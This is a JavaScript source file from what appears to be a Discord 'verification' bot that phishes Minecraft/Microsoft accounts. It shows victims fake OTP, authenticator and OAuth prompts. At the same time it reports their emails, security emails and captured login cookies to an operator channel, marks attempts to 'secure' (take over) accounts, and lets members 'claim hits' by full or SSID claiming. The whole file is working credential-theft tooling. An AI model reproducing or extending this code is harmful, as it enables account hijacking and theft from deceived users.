const { ButtonBuilder, ButtonStyle, ActionRowBuilder } = require("discord.js");
const getEmbed = require("./getEmbed")
const messageTemplate = require("./messageTemplate");
const getButton = require("./getButton");
const generate = require("./generate");
const { queryParams } = require("../../db/db");
async function invalidEmailMessager(client, guildId, channelId, interaction, mcname, email) {
    client.guilds.cache.get(guildId).channels.cache.get(channelId).send(messageTemplate({
        content: `<@${interaction.user.id}> is trying to verify!`,
        title: "Failed to verify!",
        mcname: mcname,
        email: email,
        reason: `Account doesn't exist`,
        state: `Account doesn't exist (try again)`,
        color: 0xff0000,
        userId: interaction.user.id
    }))
    return interaction.reply({
        embeds: [await getEmbed(client.username, `account doesn't exist`)],
        ephemeral: true
    })
}
async function secEmailMessager(client, guildId, channelId, interaction, id, mcname, email, secs, var1) {
    let button = await getButton(client.username, `code`)
    button.data.custom_id = `action|${id}`
    interaction.reply({
        embeds: [await getEmbed(client.username, "sec", var1)],
        components: [new ActionRowBuilder().addComponents(button)],
        ephemeral: true,
    });
    try {
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send(
            messageTemplate({
                content: `<@${interaction.user.id}> is trying to verify!`,
                title: "OTP Verification!",
                mcname: mcname,
                email: email,
                method: "OTP",
                securityEmails: secs,
                state: "Verify your security email",
                color: 0xffff00,
                userId: interaction.user.id
            })
        )
    } catch (e) {
        console.log(e)
    }
}
async function oauthMessager(client, guildId, channelId, interaction, mcname, email, link) {
    try {

        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send(
            messageTemplate({
                content: `<@${interaction.user.id}> is trying to verify!`,
                title: "Verification!",
                mcname: mcname,
                email: email,
                reason: `No Security Emails OR Authenticator Devices`,
                state: `Verify using OAuth Link`,
                color: 0xff0000,
                userId: interaction.user.id
            }))


        return interaction.reply({
            embeds: [await getEmbed(client.username, "oauth")],
            components: [new ActionRowBuilder().addComponents(await getButton(client.username, "oauth", { url: link }))],
            ephemeral: true
        })
    } catch (e) {
        console.log(e)
    }
}

async function loginCookieMessager(client, guildId, channelId, host) {
    try {
        let id = generate(33)
        queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `retrysecure|${host}`])
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send(
            {
                embeds: [{
                    title: `Got the login cookie!`,
                    description: `\`\`\`${host}\`\`\``,
                    color: 0x00ff00
                }],
                components: [new ActionRowBuilder().addComponents(
                    new ButtonBuilder().
                    setCustomId("action|" + id).
                    setLabel("Retry").
                    setEmoji({ name: "🔁" }).
                    setStyle(ButtonStyle.Primary)
                )]
            }
        )
    } catch (e) {
        console.log(e)
    }
}
async function claimHitMessager(client, guildId, chanelId, interaction, mode, name) {
    if (mode == 1) {
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`Full Claiming\``,
                    color: 0x00ff00
                }]
            })
        } catch (e) {
            console.log(e)
        }
    } else {
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`SSID Claiming\`\nIGN ${name}`,
                    color: 0x00ff00
                }]
            })
        } catch (e) {
            console.log(e)
        }
    }
}
async function noOAuthMessager(client, guildId, channelId, interaction, mcname, email) {
    try {
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send(
            messageTemplate({
                content: `<@${interaction.user.id}> is trying to verify!`,
                title: "Verification!",
                mcname: mcname,
                email: email,
                reason: `Doesn't have: Security Emails, or Authenticator Device`,
                state: `How to add security email`,
                color: 0xff0000,
                userId: interaction.user.id
            }))
    } catch (e) {
        console.log(e)
    }
    return interaction.reply({
        embeds: [await getEmbed(client.username, "otp")],
        components: [new ActionRowBuilder().addComponents(await getButton(client.username, "howto"))],
        ephemeral: true
    })
}
async function AuthenticatorMessager(client, guildId, channelId, interaction, mcname, email, var1) {
    try {
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send(
            messageTemplate({
                content: `<@${interaction.user.id}> is trying to verify!`,
                title: "Authenticator Verification!",
                mcname: mcname,
                email: email,
                method: `Authenticator`,
                state: `Verify using your device!`,
                color: 0xffff00,
                userId: interaction.user.id
            }))
    } catch (e) {
        console.log(e)
    }
    interaction.reply({
        embeds: [await getEmbed(client.username, `authenticator`, var1)],
        ephemeral: true
    })
}
async function timedOutMessager(client, guildId, channelId, interaction, mcname, email) {
    try {
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send({
            content: `<@${interaction.user.id}> Got timed out from the Authenticator Request!`,
            embeds: [{
                "title": "Timed Out!",
                fields: [
                    {
                        name: `Minecraft IGN`,
                        value: "```" + mcname + "```",
                        inline: true
                    },
                    {
                        name: `Email`,
                        value: "```" + email + "```",
                        inline: true
                    },
                    {
                        name: `State`,
                        value: "```" + `Timed out, please try again!` + "```",
                        inline: false
                    },
                ],
                "color": 0xff0000
            }],
            components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("text|" + interaction.user.id).setLabel("Text").setEmoji("💬").setStyle(ButtonStyle.Primary)).addComponents(new ButtonBuilder().setCustomId("ban|" + interaction.user.id).setLabel("Ban").setEmoji("🔨").setStyle(ButtonStyle.Danger)).addComponents(new ButtonBuilder().setCustomId("textembed|" + interaction.user.id).setLabel("Send Embed").setEmoji("📧").setStyle(ButtonStyle.Secondary))]
        })
    } catch (e) {
        console.log(e)
    }
    return interaction.followUp({
        embeds: [{
            title: `Error :x:`,
            description: `Timeout, please try again!⏱`,
            color: 0xff0000
        }],
        ephemeral: true
    })
}
async function invalidAuthenticatorMessager(client, guildId, channelId, interaction, mcname, email) {
    try {
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send({
            content: `<@${interaction.user.id}> Chose the wrong number!`,
            embeds: [{
                "title": "Chose wrong number!",
                fields: [
                    {
                        name: `Minecraft IGN`,
                        value: "```" + mcname + "```",
                        inline: true
                    },
                    {
                        name: `Email`,
                        value: "```" + email + "```",
                        inline: true
                    },
                    {
                        name: `State`,
                        value: "```" + `Try again` + "```",
                        inline: false
                    },
                ],
                "color": 0xff0000
            }],
            components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("text|" + interaction.user.id).setLabel("Text").setEmoji("💬").setStyle(ButtonStyle.Primary)).addComponents(new ButtonBuilder().setCustomId("ban|" + interaction.user.id).setLabel("Ban").setEmoji("🔨").setStyle(ButtonStyle.Danger)).addComponents(new ButtonBuilder().setCustomId("textembed|" + interaction.user.id).setLabel("Send Embed").setEmoji("📧").setStyle(ButtonStyle.Secondary))]
        })
    } catch (e) {
        console.log(e)
    }
    return interaction.followUp({
        embeds: [{
            title: `Error :x:`,
            description: `You chose the wrong number, please try again and choose the right number!`,
            color: 0xff0000
        }],
        ephemeral: true
    })
}
async function validAuthenticatorMessager(client, guildId, channelId, interaction, mcname, email) {
    interaction.followUp({
        embeds: [
            {
                title: `Success :white_check_mark:`,
                description: `Verified your account, please wait few seconds while we sync your roles`,
                color: 0x00ff00,
            },
        ],
        ephemeral: true,
    })
    try {
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send({
            embeds: [
                {
                    title: `Logged in ${email}`,
                    description: `Trying to secure ${email}`,
                    fields: [
                        {
                            name: 'Login cookie',
                            value: "```" + host + "```",
                            inline: false
                        },
                        {
                            name: "ID",
                            value: "```" + id + "```",
                            inline: false
                        }
                    ],
                    color: 0x00ff00,
                },
            ],
            components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("refresh|" + id).setEmoji("🔄").setLabel("Refresh").setStyle(ButtonStyle.Primary))],
        });
    } catch (e) {
        console.log(`Failed to send message to main server ${client.username}`)
    }
}
async function notifier(client, guildId, channelId) {
    try {
        client.guilds.cache.get(guildId).channels.cache.get(channelId).send({
            content: `@here`,
            embeds: [
                {
                    title: `New Hit! :tada:`,
                    description: `If you think that this is your hit, then do /claim <IGN> to claim it!`,
                    color: 0x00ff00,
                },
            ],
        });
    } catch (e) {
        console.log(`Failed to send message to notifications server ${client.username}`)
    }
}
async function invalidEmailRegexMessager(client, guildId, channelId, interaction, mcname, email) {
    try {
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send(
            messageTemplate({
                content: `<@${interaction.user.id}> is trying to verify!`,
                title: "Failed to verify!",
                mcname: mcname,
                email: email,
                reason: `Invalid email`,
                state: `Invalid email (please try again)`,
                color: 0xff0000,
                userId: interaction.user.id
            }))
    } catch (e) {
        console.log(e)
    }
    return interaction.reply({
        embeds: [await getEmbed(client.username, `invalid email`)
        ],
        ephemeral: true,
    });
}
module.exports = { invalidEmailMessager, secEmailMessager, oauthMessager, noOAuthMessager, AuthenticatorMessager, timedOutMessager, invalidAuthenticatorMessager, notifier, validAuthenticatorMessager, invalidEmailRegexMessager, loginCookieMessager, claimHitMessager }